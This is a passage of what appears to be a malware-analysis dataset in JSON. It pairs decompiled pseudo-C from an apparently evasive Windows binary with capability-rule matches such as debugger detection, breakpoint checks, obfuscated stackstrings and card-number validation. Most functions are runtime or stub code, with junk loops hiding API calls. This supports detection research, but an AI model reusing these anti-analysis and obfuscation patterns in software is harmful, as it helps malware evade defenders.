(uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040f155;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040f155:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f369:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3668
    },
    "0040f3ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f3ac(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0040f8ad;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0xa8daf0 - 1;\n        iVar4 = *0xa8daf0 + (*0xa8daf0 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0xa8daf0 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0040f4e1;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x0040f4e8;\ncode_r0x0040f4e1:\n                        do {\n                            var_4h = 1;\ncode_r0x0040f4e8:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x0040f4f6;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x0040f4f6:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0xa8daec - *0xa8daf0) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0xa8daec < iVar12) {\n                if (iVar12 < *0xa8dae8) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0xa8dafc;\n                    iVar4 = *0xa8daf4 + (*0xa8daf4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0xa8daf4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0xa8daf4 + (*0xa8daf4 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0xa8daf4 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0xa8dafc + *0xa8dae8;\n                    uVar5 = 1;\n                }\n                goto code_r0x0040f8ad;\n            }\n            var_10h = *0xa8daec - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0xa8daf0 - 1;\n            iVar12 = *0xa8daf0 + (*0xa8daf0 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0xa8daf0 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0040f699;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040f699:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0xa8daf4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040f8ad:\n    var_20h = iVar12 << (0x1fU - *0xa8daf4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0xa8daf8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0xa8daf8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3654
    },
    "0040d876": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d876(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004084f4(0x414800, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00406367();\n        *puVar2 = 0;\n        puVar2 = fcn.00406354();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0xaa8220)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0xaa8240;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00411894(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00406354();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00406367();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040d143(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040d948(0x414800);\n                goto code_r0x0040d942;\n            }\n        }\n        puVar2 = fcn.00406367();\n        *puVar2 = 0;\n        puVar2 = fcn.00406354();\n        *puVar2 = 9;\n        fcn.004062ec(0, 0, 0, 0, 0);\n    }\ncode_r0x0040d942:\n    fcn.00408539();\n    return;\n}\n",
        "token_count": 619
    },
    "00404536": {
        "rules": [
            "contain obfuscated stackstrings",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404536(uint32_t *param_1, uint32_t param_2)\n\n{\n    *param_1 = *param_1 ^ param_2;\n    return;\n}\n",
        "token_count": 43
    },
    "00404bc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404bc5(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
        "token_count": 47
    },
    "00404dac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404dac(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00404eca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBinaryType\n// WARNING: Variable defined which should be unmapped: lpFilePart\n\nuint fcn.00404eca(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t unaff_ESI;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    uint lpBuffer;\n    uint lpszVolumeName;\n    uint lpString1;\n    uint lpVersionInformation;\n    uint lpFindFileData;\n    uint uStackY124;\n    uint uStackY120;\n    uint *puStackY116;\n    uint uStackY112;\n    uint uStackY108;\n    uint uStackY104;\n    uint uStackY100;\n    uint *puStackY96;\n    uint *puStackY92;\n    uint *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint var_48h;\n    uint uStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint *puStackY60;\n    uint uStackY56;\n    uint uStackY52;\n    uint uStackY48;\n    uint *var_28h;\n    uint *puStackY40;\n    uint uStackY36;\n    uint *puStackY32;\n    uint *puStackY28;\n    uint32_t lpBinaryType;\n    uint lpFilePart;\n    \n    lpFilePart = 0x404ed7;\n    fcn.00405870();\n    iVar4 = 0;\n    lpBinaryType = unaff_ESI;\n    do {\n        if (iVar4 == 0x13e6) {\n            *0xaa7294 = *0xaa7294 + 0x38d6;\n        }\n        if (*0xaa7294 == 0xbd8) {\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x31a652);\n    fcn.00404eb6();\n    arg_8h = 0;\n    if (*0xaa7294 != 0) {\n        do {\n            lpBinaryType = arg_8h;\n            fcn.00404d0c(arg_8h);\n            if (*0xaa7294 == 0x29) {\n                puStackY28 = NULL;\n                puStackY32 = 0x4012bc;\n                uStackY36 = 0x4012c8;\n                puStackY40 = 0x404f42;\n                (*_sym.imp.KERNEL32.dll_MoveFileWithProgressW)();\n                puStackY40 = &fcn.00404eca::lpFilePart;\n                var_28h = 0x404f4c;\n                (*_sym.imp.KERNEL32.dll_InterlockedIncrement)();\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *0xaa7294);\n    }\n    iVar4 = 0;\n    while( true ) {\n        if (*0xaa7294 == 0x481) {\n            puStackY28 = 0x40131c;\n            puStackY32 = NULL;\n            uStackY36 = 0x404f72;\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n            uStackY36 = 0;\n            puStackY40 = 0x404f79;\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)();\n            puStackY40 = NULL;\n            var_28h = NULL;\n            uStackY48 = 0x404f81;\n            (*_sym.imp.KERNEL32.dll_FindFirstFileW)();\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_CopyFileA;\n        if (*0xaa7294 == 0x721) break;\n        iVar4 = iVar4 + 1;\n        if (0x962be1 < iVar4) {\n            if (*0xaa7294 == 0x19c) {\n                puStackY28 = NULL;\n                puStackY32 = 0x404fad;\n                (*_sym.imp.KERNEL32.dll_CopyFileA)();\n                pcVar2 = _sym.imp.KERNEL32.dll_CreateActCtxW;\n                puStackY32 = &fcn.00404eca::var_48h;\n                uStackY36 = 0x404fb9;\n                (*_sym.imp.KERNEL32.dll_CreateActCtxW)();\n                uStackY36 = 0;\n                puStackY40 = NULL;\n                var_28h = NULL;\n                uStackY48 = 0;\n                uStackY52 = 0;\n                uStackY56 = 0;\n                puStackY60 = 0x404fc5;\n                (*_sym.imp.KERNEL32.dll_UpdateResourceW)();\n                puStackY60 = &fcn.00404eca::var_28h;\n                uStackY64 = 0x404fcb;\n                (*pcVar2)();\n                uStackY64 = 0;\n                uStackY68 = 0;\n                uStackY72 = 0;\n                var_48h = 0x404fd4;\n                (*_sym.imp.KERNEL32.dll__llseek)();\n                var_48h = 0;\n                uStackY80 = 0;\n                uStackY84 = 0;\n                puStackY88 = 0x404fd9;\n                (*pcVar1)();\n            }\n            iVar4 = 0;\n            do {\n                if (iVar4 == 0xab9d) {\n                    *0xaa7290 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 0x2594b);\n            *0xa8e048 = 0;\n            iVar4 = 0;\n            do {\n                if (iVar4 == 0x148) {\n                    fcn.00404dba();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 0x427fa7);\n            puStackY28 = 0x405031;\n            fcn.00404cc0(*0xaa6e40, *0xaa7294, 0x416010);\n            iVar4 = 0;\n            do {\n                puStackY28 = NULL;\n                puStackY32 = 0x40503a;\n                (*_sym.imp.KERNEL32.dll_LocalFlags)();\n                if (iVar4 == 0x2f7e4) {\n                    puStackY28 = 0x405047;\n                    fcn.00404dac();\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 0x48122);\n            puStackY28 = 0x405055;\n            fcn.0040449a();\n            if (*0xaa7294 == 0x58c) {\n                puStackY28 = NULL;\n                puStackY32 = NULL;\n                uStackY36 = 0x405069;\n                (*_sym.imp.KERNEL32.dll_LocalShrink)();\n                uStackY36 = 0;\n                puStackY40 = &fcn.00404eca::lpszVolumeName;\n                var_28h = 0x405077;\n                (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)();\n                var_28h = &fcn.00404eca::lpFindFileData;\n                uStackY48 = 0;\n                uStackY52 = 0x405085;\n                (*_sym.imp.KERNEL32.dll_FindNextFileA)();\n                uStackY52 = 0x40508b;\n                (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n                uStackY52 = 0;\n                uStackY56 = 0;\n                puStackY60 = NULL;\n                uStackY64 = 0;\n                uStackY68 = 0x4013c0;\n                uStackY72 = 0x401420;\n                var_48h = 0x40509f;\n                (*_sym.imp.KERNEL32.dll_CopyFileExW)();\n                var_48h = 0;\n                uStackY80 = 0;\n                uStackY84 = 0;\n                puStackY88 = &fcn.00404eca::lpVersionInformation;\n                puStackY92 = 0x4050af;\n                (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)();\n                puStackY92 = &fcn.00404eca::lpFilePart;\n                puStackY96 = &fcn.00404eca::lpBuffer;\n                uStackY100 = 0;\n                uStackY104 = 0;\n                uStackY108 = 0;\n                uStackY112 = 0;\n                puStackY116 = 0x4050c4;\n                (*_sym.imp.KERNEL32.dll_SearchPathW)();\n                puStackY116 = &fcn.00404eca::lpBinaryType;\n                uStackY120 = 0;\n                uStackY124 = 0x4050cf;\n                (*_sym.imp.KERNEL32.dll_GetBinaryTypeW)();\n            }\n            puStackY28 = 0x4050d4;\n            fcn.00404da5();\n            return 0;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcatA)();\n    puStackY28 = 0x4050f3;\n    (*_sym.imp.KERNEL32.dll_RemoveVectoredExceptionHandler)();\n    puStackY28 = &fcn.00404eca::lpFilePart;\n    puStackY32 = 0x4050fd;\n    (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n    puStackY32 = NULL;\n    uStackY36 = 0x40134c;\n    puStackY40 = 0x405109;\n    (*_sym.imp.KERNEL32.dll_LoadModule)();\n    puStackY40 = 0x40136c;\n    var_28h = 0x40138c;\n    uStackY48 = 0;\n    uStackY52 = 0x40511a;\n    (*_sym.imp.KERNEL32.dll_FindResourceA)();\n    uStackY52 = 0;\n    uStackY56 = 0x405121;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 2278
    },
    "00405562": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405562(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.0040447e(param_1, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 57
    },
    "00405ac1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00405ac1(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.004084f4(0x4145a0, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.00406354();\n        *puVar1 = 0x16;\n        fcn.004062ec(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.004086dc();\n        fcn.004087f4(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.004086dc();\n        arg_8h_00 = fcn.00408891(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.004086dc();\n        uVar4 = fcn.00408a07(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.004086dc();\n        fcn.0040892d(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00405b5d();\n    }\n    fcn.00408539();\n    return;\n}\n",
        "token_count": 457
    },
    "00405b5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405b5d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004086dc();\n    fcn.00408862(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "00407637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00407637(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.0040c533();\n    return in_ST0;\n}\n",
        "token_count": 88
    },
    "004099f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004099f3(uint arg_8h)\n\n{\n    fcn.004098c7(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040a3a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a3b8)\n// WARNING: Removing unreachable block (ram,0x0040a3be)\n// WARNING: Removing unreachable block (ram,0x0040a3c0)\n\nvoid fcn.0040a3a4(void)\n\n{\n    return;\n}\n",
        "token_count": 71
    },
    "0041239f": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041239f(void)\n\n{\n    *0xa8dfcc = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x404354, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00404d0c": {
        "rules": [
            "get common file path",
            "print debug messages",
            "create directory",
            "delete directory"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpNumberOfEventsRead\n\nvoid __cdecl fcn.00404d0c(int32_t arg_8h)\n\n{\n    uint var_1818h;\n    uint var_1018h;\n    uint lpBuffer;\n    uint uStack84;\n    uint uStack80;\n    uint *puStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint *puStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack32;\n    uint *var_18h;\n    uint *puStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint lpNumberOfEventsRead;\n    \n    lpNumberOfEventsRead = 0x404d19;\n    fcn.00405870();\n    if (*0xaa7294 == 0x37) {\n        uStack12 = 0x401230;\n        uStack16 = 0x404d2e;\n        (*_sym.imp.KERNEL32.dll_OutputDebugStringW)();\n        uStack16 = 0x401274;\n        uStack20 = 0x404d39;\n        (*_sym.imp.KERNEL32.dll_RemoveDirectoryA)();\n        uStack20 = 0;\n        puStack24 = &fcn.00404d0c::lpBuffer;\n        var_18h = 0x404d49;\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        var_18h = &fcn.00404d0c::var_1018h;\n        uStack32 = 0;\n        